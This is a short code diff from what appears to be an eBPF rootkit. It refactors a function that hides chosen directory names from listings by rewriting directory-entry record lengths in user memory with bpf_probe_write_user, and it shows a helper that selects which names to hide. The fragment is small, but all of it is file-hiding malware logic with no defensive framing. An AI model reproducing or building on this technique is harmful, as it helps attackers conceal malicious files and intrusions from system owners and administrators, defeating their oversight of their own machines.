@@ -28,7 +28,7 @@ bool is_dirname_to_hide(int max_str_len, u8 * dirname, u8 * dirname_to_hide) {
 }
 
 static __always_inline
-bool remove_curr_dirent(u8 * dirname, struct dirents_data_t * data) {
+bool remove_curr_dirent(struct dirents_data_t * data) {
    struct linux_dirent64 *dirent_previous = get_dirent(*data->dirents_buf, (data->bpos - data->d_reclen_prev));
    u16 d_reclen_new = data->d_reclen + data->d_reclen_prev;
    return bpf_probe_write_user(&dirent_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new)) == 0;
